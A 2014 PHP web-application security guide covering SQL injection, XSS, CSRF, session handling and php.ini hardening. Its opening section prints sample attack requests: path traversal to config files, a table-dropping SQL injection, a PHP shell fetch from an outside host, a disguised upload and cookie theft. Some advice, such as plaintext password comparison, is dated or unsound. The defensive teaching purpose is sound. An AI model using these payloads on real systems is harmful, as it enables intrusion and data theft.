#PHP Security Basics

*Prepared by Alex Cameron, 2014*

##OWASP
The Open Web Application Security Project (OWASP) is the central resource all developers and administrators should be familiar with, and consult regularly.

https://www.owasp.org/index.php/Main_Page

##How your app is going to be hacked
To break in to your application, a Malicious Actor (MA) needs to fool or convince it to accept some kind of input that it shouldn't. The attacker needs to probe your software again and again by trial and error.

That input can only come from the following places:
```http
<!-- set the included file to be the DB info -->
GET /page.php?include=../../../../../wp-config.php HTTP/1.0 
```

```bash
# Inject SQL into a login via POST
POST /route 
username=bad&pass='">DROP%20TABLE%20users-- 
```

```http
<!-- let's break the script (fuzz it) to get an error print out -->
GET /timeout.php?id=文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表قائمة النصقائمة النص文字列表文字列表文字列表文字列表文字列表文قائمة النصقائمة النص字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表文字列表قائمة النصقائمة النصقائمة النص HTTP/1.0 
```

```http
<!-- Inject PHP into $_SERVER -->
GET /path/file.php HTTP/1.0
User-Agent: Internet Explorer<? file_get_contents('example.com/c99.txt'); ?> 10.01 Mozilla
```

```http
<!-- Send a PHP file as a JPEG -->
POST /upload.php HTTP/1.1
Host: www.introuble.com
Connection: close
Content-Length: FAKE
User-Agent: Evil Robot
Content-Type: multipart/form-data;
------ThisIsABoundary
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: image/jpeg
 
<?php phpinfo(); eval(); file_get_contents()
------ThisIsABoundary--
```

```php
/* use JHead to embed PHP in EXIF image data http://www.sentex.net/~mwandel/jhead/ and/or rename bad.php to bad.jpg in our uploader */
$destination = "uploads/" . $_FILES["file"]["name"];
move_uploaded_file($_FILES["file"]["tmp_name"], $destination);
/* now just visit the URL */
```

```js
/* Steal the PHP cookie from the logged in user over Wi-fi and copy it into our browser to hijack their session */
alert(document.cookie.match(/PHPSESSID=[^;]+/));
```
```bash
# Print a hostile iframe into the next page
POST /publishable 
thingtoecho=<iframe src='xssattack.com/malware.pl'></iframe>&exec={json:{"executeme:true}} 
```

If they are smart, they will be using **Tor** or a **VPN**. These are difficult to detect as they are just standard IP pools, but your code should have some degree of network awareness, or block suspect/blacklisted sources.

The bad data will be sent through:

- $_GET 
- $_POST 
- $_REQUEST 
- $_SERVER 
- phpinput://

**None of these attacks can get through if your application refuses to accept that input.**

The rules:

- Do not assume the request is from who you think it is.
- Do not trust the input you are given.
- Do not accept input you do not require.
- Check the input to make sure it is a) what you specify it must be, and b) it is what it says it is.
- Know how to identify who is sending something bad.

## What's going to be uploaded
SQL injection sends database commands using *UNION* and *information_schema* to bleed the contents of a database onto a database-driven page.

The goal of a hacker is usually to take over the server as a slave bot (e.g. to upload phishing pages), or to steal the database contents. To do that, they need to upload a **PHP shell**: a remote control script. It is usually loaded as a *.txt* file from an external host after probing */proc/self/environ*, hence why it's a good idea to turn off *allow_url_fopen*.

The 2 most common shells allow you to send commands to *shell_exec* and browse the web directory. They are:

- c99.php
- r57.php

A real-life pseudo-code example is:
```php
file_get_contents('http://www.r57shell.net/shell/c99.txt');
// or move_uploaded_file
```

http://www.r57shell.net/

##Never leave test data lying around, ever
Do not leave files like */phpinfo.php* or */admin* on a server. Just don't.

https://www.google.com/search?q=filetype:php%20-site:php.net%20intitle:phpinfo%20%22published%20by%20the%20PHP%20Group%22&gws_rd=ssl

Enjoy: http://www.exploit-db.com/google-dorks/

##Don't store anything sensitive in plain text, MD5, or using PASSWORD()
Why? All 50,000+ entries in the Latin dictionaries have already been hashed into static values and put into *rainbow tables*. They are trivial to crack with brute-force. Use **mcrypt** or *hash_password* with salting instead so the value changes regularly. 

```bash
# password of '12345' as MD5 and MySQL
827ccb0eea8a706c4c34a16891f84e7b
*00A51F3F48415C7D4E8908980D443C29C69B60C9
```
Encrypting a value with AES128 in PHP:
```php
# AES is a BINARY format so needs BASE64
$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
$iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM);
$key = pack('H*', "bcb04b7e103a0cd8b54763051cef08bc55abe029fdebae5e1d417e2ffb2a00a3");
# show key size use either 16, 24 or 32 byte keys for AES-128, 192
# and 256 respectively
$key_size =  strlen($key);
echo "Key size: " . $key_size . "\n";
$text = "Meet me at 11 o'clock behind the monument.";
echo strlen($text) . "\n";

$crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $text, MCRYPT_MODE_CBC, $iv);
echo strlen($crypttext) . "\n";
```
Encrypting data in MySQL using a shared secret to a VARBINARY field:
```sql
INSERT INTO table VALUES (1,AES_ENCRYPT('text', SHA2('My secret passphrase',512))
```

You can also use the *openssl* functions in PHP to provide public-key cryptography: http://php.net/manual/en/book.openssl.php

And never use a password in a SQL query. Use this logic instead:

```php
// SQL: SELECT id, pwd WHERE email = EMAIL
// $dbrecord = query()
if( $supplied_password === $dbrecord->pwd ) {
 // log in
}
```

- http://www.whatsmypass.com/the-top-500-worst-passwords-of-all-time
- http://www.hashkiller.co.uk/ (131BN decrypted hashes indexed)
- http://project-rainbowcrack.com/

##If you can't get an HTTP response, you can't get in

###Use Basic Auth
Use **htpasswd** to stop the HTTP handshake.

```bash
curl -X HEAD -i http://www.weareinteractive.ca
```
```http
HTTP/1.1 200 OK
Connection: keep-alive
Set-Cookie: __cfduid=d5ad319f86194ff91279c7d35fa66f9bb1416450282; expires=Fri, 20-Nov-15 02:24:42 GMT; path=/; domain=.weareinteractive.ca; HttpOnly
Set-Cookie: lang=fr; expires=Thu, 20-Nov-2014 03:24:42 GMT; path=/
X-Powered-By: PleskLin
Server: cloudflare-nginx
```
If you cannot inspect the headers, you cannot profile the target. 

```js
    location ^~ /admin-route/ {
        auth_basic "Protected Area";
        auth_basic_user_file /path/to/.htpasswd;
        try_files $uri $uri/ /index.php?$args;
    }
```

####Note on Apache SetHandler
PHP code should be configured to run using a 'SetHandler' directive. In many instances, it is wrongly configured using an 'AddHander' directive. This works, but also makes other files executable as PHP code - for example, a file name "foo.php.txt" will be handled as PHP code, which can be a very serious remote execution vulnerability if "foo.php.txt" was not intended to be executed (e.g. example code) or came from a malicious file upload.

####Use mod_security

Along with **mod_evasive**, the lion of all web application security is Apache's **mod_security** module, which is a Web Application Firewall (WAF). It works by looking for suspicious patterns in GET and POST requests, and blocking them with a HTTP 406 error. Installing it can defeat up to 80% of attacks. 

*Rulesets can be downloaded from **OWASP**.*

Examples:
```http
GET /page.php?include=../../../../../../../../etc/passwd
POST ?foo=bar&image_file=danger.php
GET /login.php?username=admin'">DROP%20TABLE%20users--
```

> "ModSecurity™ is an open source, free web application firewall (WAF)
> Apache module. With over 70% of all attacks now carried out over the
> web application level, organizations need all the help they can get in
> making their systems secure. WAFs are deployed to establish an
> external security layer that increases security, detects and prevents
> attacks before they reach web applications. It provides protection
> from a range of attacks against web applications and allows for HTTP
> traffic monitoring and real-time analysis with little or no changes to
> existing infrastructure."

- https://www.modsecurity.org/
- https://github.com/SpiderLabs/ModSecurity
- https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project

###Attack Tests
The industry term for vulnerability discovery and legal "hacking" is **penetration testing**. It requires *written agreement* from a target, or you're going to jail.

####Professional Setup

The default system used by engineers is **Kali Linux** (formerly *BackTrack*: https://www.kali.org/).

The best known tools are **Core Impact** (http://www.coresecurity.com/core-impact-pro) and **MetaSploit** (http://www.metasploit.com/).

####Other important tools

- Acunetix (WAS): https://www.acunetix.com/
- Aircrack-ng/Kismet (Wi-Fi): http://www.aircrack-ng.org/
- Burpsuite (WAS): http://portswigger.net/burp/
- Cain & Abel (ARP poisoning): http://www.oxid.it/cain.html
- Ettercap (MITM attacks): http://ettercap.github.io/ettercap/
- Hackbar (Firefox): https://addons.mozilla.org/en-US/firefox/addon/hackbar/
- John The Ripper (password cracking): http://www.openwall.com/john/
- Nessus (scanning): http://www.tenable.com/products/nessus
- Ratproxy (Proxying): https://code.google.com/p/ratproxy/
- Skipfish (Recon): https://code.google.com/p/skipfish/
- SQLMap (SQL injection): http://sqlmap.org/
- Tamper (Firefox): https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
- W3af (Auditing): http://w3af.org/
- Wapiti (WAS): http://wapiti.sourceforge.net/
- WebScarab (WAS): http://en.wikipedia.org/wiki/WebScarab
- Wfuzz (Brute-forcing): http://www.edge-security.com/wfuzz.php
- Zed Attack Proxy (WAS): https://code.google.com/p/zaproxy/

####WPScan
Special mention needs to be made of the main Wordpress vulnerability scanner **wpscan**, which is provided as a *rubygem*.

> "WPScan is a black box WordPress Security Scanner written in Ruby
> which attempts to find known security weaknesses within WordPress
> installations. Its intended use it to be for security professionals or
> WordPress administrators to asses the security posture of their
> WordPress installations."

```bash
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
sudo gem install bundler && bundle install --without test
ruby wpscan.rb --update
ruby wpstools.rb --check-local-vulnerable-files /var/www/wordpress/
ruby wpscan.rb --url www.target.com --enumerate
```

- http://wpscan.org/
- https://wpvulndb.com/
- http://codex.wordpress.org/Hardening_WordPress

*For more comprehensive notes on hardening the waking security nightmare that is Wordpress, see the separate Wordpress security configuration guide.*

##Always, always use SSL
HTTP is **plain text**, as are other protocols like FTP, SMTP, and SIP. Anyone on the same Wi-fi network or LAN can sniff and record traffic.

It's simple using Kismet (https://www.kismetwireless.net/) and/or Wireshark (https://www.wireshark.org/), revealing reconstructed HTTP or SIP packets such as:

```http
POST /users/login HTTP/1.1
HOST: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
<!-- steal this cookie header to clone the session -->

username=ME&password=pass
```

```sip
INVITE sip:user2@server2.com SIP/2.0
Via: SIP/2.0/UDP pc33.server1.com;branch=z9hG4bK776asdhds Max-Forwards: 70 
To: user2 <sip:user2@server2.com>
From: user1 <sip:user1@server1.com>;tag=1928301774
Call-ID: a84b4c76e66710@pc33.server1.com 
CSeq: 314159 INVITE 
Contact: <sip:user1@pc33.server1.com>
Content-Type: application/sdp 
Content-Length: 142

---- User1 Message Body Not Shown ----
```

- http://wiki.wireshark.org/SampleCaptures
- http://www.wireless-nets.com/resources/tutorials/sniff_packets_wireshark.html
- http://www.slideshare.net/fozavci/hacking-sip-likeaboss22


##PHP isn't a helpfully secure language
####Weak typing
PHP is weakly typed, which means that it will automatically convert data of an incorrect type into the expected type. This feature very often masks errors by the developer or injections of unexpected data, leading to vulnerabilities (see “Input handling” below for an example).

Try to use functions and operators that do not do implicit type conversions (e.g. === and not ==). Not all operators have strict versions (for example greater than and less than), and many built-in functions (like in_array) use weakly typed comparison functions by default, making it difficult to write correct code.

####Exceptions and error handling
Almost all PHP builtins, and many PHP libraries, do not use exceptions, but instead report errors in other ways (such as via notices) that allow the faulty code to carry on running. This has the effect of masking many bugs. In many other languages, and most high level languages that compete with PHP, error conditions that are caused by developer errors, or runtime errors that the developer has failed to anticipate, will cause the program to stop running, which is the safest thing to do.

Consider the following code which attempts to limit access to a certain function using a database query that checks to see if the username is on a black list:
```php
   $db_link = mysqli_connect('localhost', 'dbuser', 'dbpassword', 'dbname');
   function can_access_feature($current_user) {
       global $db_link;
       $username = mysqli_real_escape_string($db_link, $current_user->username);
       $res = mysqli_query($db_link, "SELECT COUNT(id) FROM blacklisted_users WHERE username = '$username';");
       $row = mysqli_fetch_array($res);
       if ((int)$row[0] > 0) {
           return false;
       } else {
           return true;
       }
   }
   if (!can_access_feature($current_user)) {
       exit();
   }
   
   // Code for feature here
```
There are various runtime errors that could occur in this - for example, the database connection could fail, due to a wrong password or the server being down etc., or the connection could be closed by the server after it was opened client side. In these cases, by default the mysqli_ functions will issue warnings or notices, but will not throw exceptions or fatal errors. This means that the code simply carries on! The variable \$row becomes NULL, and PHP will evaluate \$row[0] also as NULL, and \(int)$row[0] as 0, due to weak typing. Eventually the can_access_feature function returns true, giving access to all users, whether they are on the blacklist or not.

The correct way to deal with this is to add error checking at every point. However, since this requires additional work, and is easily missed, this is insecure by default. It also requires a lot of boilerplate. While PHP in some ways appears to be a high-level language, when it comes to errors it is a low-level language like C, and requires diligent checking of many possibly error conditions. This makes it much harder to write secure code using PHP than with other high-level languages that are normally used for web development.

It is often best to turn up error reporting as high as possible using the error_reporting function, and never attempt to suppress error messages — always follow the warnings and write code that is more robust.

####php.ini
The behaviour of PHP code often depends strongly on the values of many configuration settings, including fundamental changes to things like how errors are handled. This can make it very difficult to write code that works correctly in all circumstances. Different libraries can have different expectations or requirements about these settings, making it difficult to correctly use 3rd party code. 

####Unhelpful built-in crap
PHP comes with many built-in functions, such as *addslashes*, *mysql_escape_string* and *mysql_real_escape_string*, that appear to provide security, but are often buggy and, in fact, are unhelpful ways to deal with security problems.

Some of these built-ins are being deprecated and removed, but due to backwards compatibility policies this takes a long time.

PHP also provides an 'array' data structure, which is used extensively in all PHP code and internally, that is a confusing mix between an array and a dictionary. This confusion can cause even experienced PHP developers to introduce critical security vulnerabilities such as Drupal SA-CORE-2014-005 (https://www.drupal.org/SA-CORE-2014-005).

##Don't rely on frameworks

####URL routing
PHP’s built-in URL routing mechanism is to use files ending in “.php” in the directory structure. This opens up several vulnerabilities:

- Remote execution vulnerability for every file upload feature that does not sanitise the filename. Ensure that when saving uploaded files, the content and filename are appropriately sanitised.
- Source code, including config files, are stored in publicly accessible directories along with files that are meant to be downloaded (such as static assets). Misconfiguration (or lack of configuration) can mean that source code or config files that contain secret information can be downloaded by attackers. You can use .htaccess to limit access. This is not ideal, because it is insecure by default, but there is no other alternative.

####Input handling
Instead of treating HTTP input as simple strings, PHP will build arrays from HTTP input, at the control of the client. This can lead to confusion about data, and can easily lead to security bugs. For example, consider this simplified code from a "one time nonce" mechanism that might be used, for example in a password reset code:

```php
   $supplied_nonce = $_GET['nonce'];
   $correct_nonce = get_correct_value_somehow();
   
   if (strcmp($supplied_nonce, $correct_nonce) == 0) {
       // Go ahead and reset the password
   } else {
       echo 'Sorry, incorrect link';
   }
```
If an attacker uses a querystring like this:
```http
   http://example.com/?nonce[]=a
```
then we end up with $supplied_nonce being an array. The function strcmp() will then return NULL (instead of throwing an exception, which would be much more useful), and then, due to weak typing and the use of the == (equality) operator instead of the === (identity) operator, the comparison succeeds (since the expression NULL == 0 is true according to PHP), and the attacker will be able to reset the password without providing a correct nonce.

##Don't trust ANY input 

All data that is a product, or subproduct, of user input is to **NOT be trusted**. They have to either be validated, using the correct methodology, or filtered, before considering them untainted.

####Super-globals are easily faked
Super globals which are not to be trusted are $_SERVER, $_GET, $_POST, $_REQUEST, $_FILES and $_COOKIE. Not all data in $_SERVER can be faked by the user, but a considerable amount in it can, particularly and specially everything that deals with HTTP headers (they start with HTTP_).

####File uploads
Files received from a user pose various security threats, especially if other users can download these files. In particular:

- Any file served as HTML can be used to do an XSS attack.
- Any file treated as PHP can be used to do an extremely serious attack - a remote execution vulnerability.
- Since PHP is designed to make it very easy to execute PHP code (just a file with the right extension), it is particularly important for PHP sites (any site with PHP installed and configured) to ensure that uploaded files are only saved with sanitised file names.

####The $_FILES array is a serious danger zone
It is common to find code snippets online doing something similar to the following code:
```php
   if ($_FILES['some_name']['type'] == 'image/jpeg') {  
       //Proceed to accept the file as a valid image
   }
```
However, the type is not determined by using heuristics that validate it, but by simply reading the data sent by the HTTP request, which is created by a client. A better, yet not perfect, way of validating file types is to use finfo class.
```php
   $finfo = new finfo(FILEINFO_MIME_TYPE);
   $fileContents = file_get_contents($_FILES['some_name']['tmp_name']);
   $mimeType = $finfo->buffer($fileContents);
```
Where $mimeType is a better checked file type. This uses more resources on the server, but can prevent the user from sending a dangerous file and fooling the code into trusting it as an image, which would normally be regarded as a safe file type.

####$_REQUEST is bad
This super global is not recommended since it includes not only POST and GET data, but also the cookies sent by the request. This can lead to confusion and makes your code prone to mistakes.

##SQL Injection: the big daddie

Since a single SQL Injection vulnerability permits the hacking of your website, and every hacker first tries SQL injection flaws, fixing SQL injections are the first step to securing your PHP powered application. Abide to the following rules:

####Never concatenate or interpolate data in SQL
Never build up a string of SQL that includes user data, either by concatenation:
```php
$sql = "SELECT * FROM users WHERE username = '" . $username . "';";
```
or interpolation, which is essentially the same:
```php
$sql = "SELECT * FROM users WHERE username = '$username';";
```
 
If $username has come from an untrusted source (and you must assume it has, since you cannot easily see that in source code), it could contain characters such as ' that will allow an attacker to execute very different queries than the one intended, including deleting your entire database etc.

####Escaping is not safe
*mysql_real_escape_string* is not safe. Don't rely on it for your SQL injection prevention. When you use *mysql_real_escape_string* on every variable and then concat it to your query, you are bound to forget that at least once, and once is all it takes. You can't force yourself in any way to never forget. In addition, you have to ensure that you use quotes in the SQL as well, which is not a natural thing to do if you are assuming the data is numeric, for example. Instead use prepared statements, or equivalent APIs that always do the correct kind of SQL escaping for you. (Most ORMs will do this escaping, as well as creating the SQL for you).

####Use Prepared Statements
Prepared statements are very secure. In a prepared statement, data is separated from the SQL command, so that everything user inputs is considered data and put into the table the way it was.

#####Where prepared statements do not work
The problem is, when you need to build dynamic queries, or need to set variables not supported as a prepared variable, or your database engine does not support prepared statements. For example, PDO MySQL does not support ? as LIMIT specifier. In these cases, you should use query builder that is provided by a framework. Do not roll your own.

####Object Relational Mappers
ORMs are good security practice. If you're using an ORM (like Doctrine) in your PHP project, you're still prone to SQL attacks. Although injecting queries in ORM's is much harder, keep in mind that concatenating ORM queries makes for the same flaws that concatenating SQL queries, so NEVER concatenate strings sent to a database. ORM's support prepared statements as well.

####Use UTF-8 unless another charset is necessary
Many new attack vectors rely on encoding bypassing. Use UTF-8 as your database and application charset unless you have a mandatory requirement to use another encoding.
```php
   $DB = new mysqli($Host, $Username, $Password, $DatabaseName);
   if (mysqli_connect_errno())
       trigger_error("Unable to connect to MySQLi database.");
   $DB->set_charset('UTF-8');
```

##Shell Injection
*shell_exec*, *exec*, *passthru*, *system* and the backtick operator ( ` )
run a string as shell scripts and commands. Input provided to these functions (specially backtick operator that is not like a function). Depending on your configuration, shell script injection can cause your application settings and configuration to leak, or your whole server to be hijacked. This is a very dangerous injection and is somehow considered the haven of an attacker.

Never pass tainted input to these functions - that is input somehow manipulated by the user - unless you're absolutely sure there's no way for it to be dangerous (which you never are without whitelisting). Escaping and any other countermeasures are ineffective, there are plenty of vectors for bypassing each and every one of them; don't believe what novice developers tell you.

##Eval is your worst nightmare
All interpreted languages such as PHP, have some function that accepts a string and runs that in that language. In PHP this function is named *eval()*. Using eval is a very bad practice, not just for security. If you're absolutely sure you have no other way but eval, use it without any tainted input. Eval is usually also slower.

Function *preg_replace()* should not be used with unsanitised user input, because the payload will be eval()'ed. Eval is often used with *base64_decode()* to run malware.
```php
   preg_replace("/.*/e","system('echo /etc/passwd')");
```
Reflection also could have code injection flaws. 

LDAP, XPath and any other third party application that runs a string, is vulnerable to injection. Always keep in mind that some strings are not data, but commands and thus should be secure before passing to third party libraries.

##Escape all tags and markup
Most of the time, there is no need for user supplied data to contain unescaped HTML tags when output. For example when you're about to dump a textbox value, or output user data in a cell.

If you are using standard PHP for templating, or `echo` etc., then you can mitigate XSS in this case by applying *htmlspecialchars* to the data, or the following function (which is essentially a more convenient wrapper around *htmlspecialchars*). However, this is not recommended. The problem is that you have to remember to apply it every time, and if you forget once, you have an XSS vulnerability. Methodologies that are insecure by default must be treated as insecure.

Instead of this, you should use a template engine that applies HTML escaping by default. All HTML should be passed out through the template engine.

If you cannot switch to a secure template engine, you can use the function below on all untrusted data.

Keep in mind that this scenario won't mitigate XSS when you use user input in dangerous elements (style, script, image's src, a, etc.), but mostly you don't. Also keep in mind that every output that is not intended to contain HTML tags should be sent to the browser filtered with the following function.
```php
//xss mitigation functions
function xssafe($data,$encoding='UTF-8')
{
   return htmlspecialchars($data,ENT_QUOTES | ENT_HTML401,$encoding);
}
function xecho($data)
{
   echo xssafe($data);
}
//usage example
<input type='text' name='test' value='<?php 
xecho ("' onclick='alert(1)");
?>' />
```
##Dealing with XSS
- Don't have a trusted section in any web application. Many developers tend to leave admin areas out of XSS mitigation, but most intruders are interested in admin cookies and XSS. Every output should be cleared by the functions provided above, if it has a variable in it. Remove every instance of *echo*, *print*, and *printf* from your application and replace them with a secure template engine.
- HTTP-Only cookies are a very good practice, for a near future when every browser is compatible. Start using them.
- The function declared above, only works for valid HTML syntax. If you put your Element Attributes without quotation, you're doomed. Go for valid HTML.
- Reflected XSS is as dangerous as normal XSS, and usually comes at the most dusty corners of an application. Seek it and mitigate it.
- Not every PHP installation has a working *mhash* extension, so if you need to do hashing, check it before using it. Otherwise you can't do SHA-256.
- Not every PHP installation has a working *mcrypt* extension, and without it you can't do AES. Do check if you need it.

##POST requests are easily forged
CSRF mitigation is easy in theory, but hard to implement correctly. 

- **Every request that does something noteworthy, should require CSRF**. 
- Noteworthy things are changes to the system, and reads that take a long time.

CSRF mostly happens on GET (replay attacks), but is easy to happen on POST. Don't ever think that post is secure.

- Use re-authentication for critical operations (change password, recovery email, etc.)
- If you're not sure whether your operation is CSRF proof, consider adding CAPTCHAs (however CAPTCHAs are inconvenience for users)
- If you're performing operations based on other parts of a request (neither GET nor POST) e.g Cookies or HTTP Headers, you might need to add CSRF tokens there as well.
- AJAX powered forms need to re-create their CSRF tokens. Use the function provided above (in code snippet) for that and never rely on Javascript.
- CSRF on GET or Cookies will lead to inconvenience, consider your design and architecture for best practices.

Forging a POST request is a type of **replay attack**:

> A replay attack (also known as playback attack) is a form of network
> attack in which a valid data transmission is maliciously or
> fraudulently repeated or delayed. This is carried out either by the
> originator or by an adversary who intercepts the data and retransmits
> it, possibly as part of a masquerade attack by IP packet substitution
> (such as stream cipher attack).

- http://en.wikipedia.org/wiki/Replay_attack

##Sessions are hijacked through a single cookie

Many websites are vulnerable on remember me features. The correct practice is to generate a one-time token for a user and store it in the cookie. The token should also reside in data store of the application to be validated and assigned to user. This token should have no relevance to username and/or password of the user, a secure long-enough random number is a good practice.

It is better if you imply locking and prevent brute-force on remember me tokens, and make them long enough, otherwise an attacker could brute-force remember me tokens until he gets access to a logged in user without credentials.

**Never store username/password or any relevant information in a cookie.**

PHP's default session facilities are considered safe, the generated PHPSessionID is random enough, but the storage is not necessarily safe:

Session files are stored in temp (*/tmp*) folder and are world writable unless *suPHP* installed, so any LFI or other leak might end-up manipulating them.
Sessions are stored in files in default configuration, which is terribly slow for highly visited websites. You can store them on a memory folder (if UNIX).

You can implement your own session mechanism, without ever relying on PHP for it. If you did that, store session data in a database. You could use all, some or none of the PHP functionality for session handling if you go with that.

####Find out if their IP has changed
It is good practice to bind sessions to IP addresses, that would prevent most session hijacking scenarios (but not all), however some users might use anonymity tools (such as TOR) and they would have problems with your service.

To implement this, simply store the client IP in the session first time it is created, and enforce it to be the same afterwards. The code snippet below returns client IP address:
```php
$IP = getenv ( "REMOTE_ADDR" );
```
Keep in mind that in local environments, a valid IP is not returned, and usually the string *:::1* or *:::127* might pop up, thus adapt your IP checking logic. Also beware of versions of this code which make use of the *HTTP_X_FORWARDED_FOR* variable as this data is effectively user input and therefore susceptible to spoofing (more information here and here )

####Invalidate Session ID
You should invalidate (unset cookie, unset session storage, remove traces) of a session whenever a violation occurs (e.g 2 IP addresses are observed). A log event would prove useful. Many applications also notify the logged in user (e.g GMail).

####Rolling of Session ID
You should roll session ID whenever elevation occurs, e.g when a user logs in, the session ID of the session should be changed, since it's importance is changed.

####Exposed Session ID
Session IDs are considered confidential, your application should not expose them anywhere (specially when bound to a logged in user). Try not to use URLs as session ID medium.

Transfer session ID over TLS whenever session holds confidential information, otherwise a passive attacker would be able to perform session hijacking.

####Session Fixation
Invalidate the Session id after user login (or even after each request) with *session_regenerate_id()*.

####Session Expiration
A session should expire after a certain amount of inactivity, and after a certain time of activity as well. The expiration process means invalidating and removing a session, and creating a new one when another request is met.

Also keep the log out button close, and unset all traces of the session on log out.

####Inactivity Timeout
Expire a session if current request is X seconds later than the last request. For this you should update session data with time of the request each time a request is made. The common practice time is 30 minutes, but highly depends on application criteria.

This expiration helps when a user is logged in on a publicly accessible machine, but forgets to log out. It also helps with session hijacking.

####General Timeout
Expire a session if current session has been active for a certain amount of time, even if active. This helps keeping track of things. The amount differs but something between a day and a week is usually good. To implement this you need to store start time of a session.

##Cookies can be edited
####Never Serialize
Never serialize data stored in a cookie. It can easily be manipulated, resulting in adding variables to your scope.

####Proper Deletion
To delete a cookie safely, use the following:
```php
setcookie ($name, "", 1);
setcookie ($name, false);
unset($_COOKIE[$name]);
```
The first line ensures that cookie expires in browser, the second line is the standard way of removing a cookie (thus you can't store false in a cookie). The third line removes the cookie from your script. Many guides tell developers to use time() - 3600 for expiry, but it might not work if browser time is not correct.

You can also use *session_name()* to retrieve the name default PHP session cookie.

####HTTP Only Cookies
Most modern browsers support HTTP-only cookies. These cookies are only accessible via HTTP(s) requests and not JavaScript, so XSS snippets can not access them. They are very good practice, but are not satisfactory since there are many flaws discovered in major browsers that lead to exposure of HTTP only cookies to JavaScript.

To use HTTP-only cookies in PHP (5.2+), you should perform session cookie setting manually (not using *session_start*):
```php
#prototype
bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )
```
```php
#usage
if (!setcookie("MySessionID", $secureRandomSessionID, $generalTimeout, $applicationRootURLwithoutHost, NULL, NULL,true))
    echo ("could not set HTTP-only cookie");
```
The path parameter sets the path which cookie is valid for, e.g if you have your website at example.com/some/folder the path should be /some/folder or other applications residing at example.com could also see your cookie. If you're on a whole domain, don't mind it. Domain parameter enforces the domain, if you're accessible on multiple domains or IPs ignore this, otherwise set it accordingly. If secure parameter is set, cookie can only be transmitted over HTTPS. See the example below:
```php
$r=setcookie("SECSESSID","1203j01j0s1209jw0s21jxd01h029y779g724jahsa9opk123973",time()+60*60*24*7 /*a week*/,"/","example.org",true,true);
if (!$r) die("Could not set session cookie.");
```
###Internet Explorer sucks, as always
Many version of Internet Explorer tend to have problems with cookies. Mostly setting Expire time to 0 fixes their issues.

##Hardening php.ini settings
####suPHP is good
suPHP makes every php script run as its file owner. This way you are allowed to upload and modify files in your folders without needing to chmod 777 any folder, which is very bad security practice and will let to your files be compromised easily. Install and configure it on your web server.

####suhosin is good
Consider using Suhosin (http://www.hardened-php.net/suhosin/index.html) if you want to patch many custom security flaws in various parts of PHP.

####Battened-down hatches
```ini
; ERRORS
expose_php              = Off
error_reporting         = E_ALL
display_errors          = Off
display_startup_errors  = Off
log_errors              = On
error_log               = /valid_path/PHP-logs/php_error.log
ignore_repeated_errors  = Off

; GENERAL
doc_root                = /path/DocumentRoot/PHP-scripts/
open_basedir            = /path/DocumentRoot/PHP-scripts/
include_path            = /path/PHP-pear/
extension_dir           = /path/PHP-extensions/
mime_magic.magicfile       = /path/PHP-magic.mime
allow_url_fopen         = Off
allow_url_include       = Off
variables_order         = "GPSE"
allow_webdav_methods    = Off

; UPLOADS
file_uploads            = On
upload_tmp_dir          = /path/PHP-uploads/
max_file_uploads        = 2

; EXECUTION 
enable_dl               = On
disable_functions       = system, exec, shell_exec, passthru, phpinfo, show_source, popen, proc_open
disable_functions       = fopen_with_path, dbmopen, dbase_open, putenv, move_uploaded_file
disable_functions       = chdir, mkdir, rmdir, chmod, rename
disable_functions       = filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo
# see also: http://ir.php.net/features.safe-mode
disable_classes         = 

; SESSIONS
session.auto_start      = Off
session.save_path       = /path/PHP-session/
session.name            = myPHPSESSID
session.hash_function   = 1
session.hash_bits_per_character = 6
session.use_trans_sid   = 0
session.cookie_domain   = full.qualified.domain.name
#session.cookie_path     = /application/path/
session.cookie_lifetime = 0
session.cookie_secure   = On
session.cookie_httponly = 1
session.use_only_cookies= 1
session.cache_expire    = 30
default_socket_timeout  = 60
 
; PARANOIA
session.referer_check   = /application/path
memory_limit            = 32M
post_max_size           = 32M
max_execution_time       = 60
report_memleaks         = On
track_errors            = Off
html_errors             = Off
```
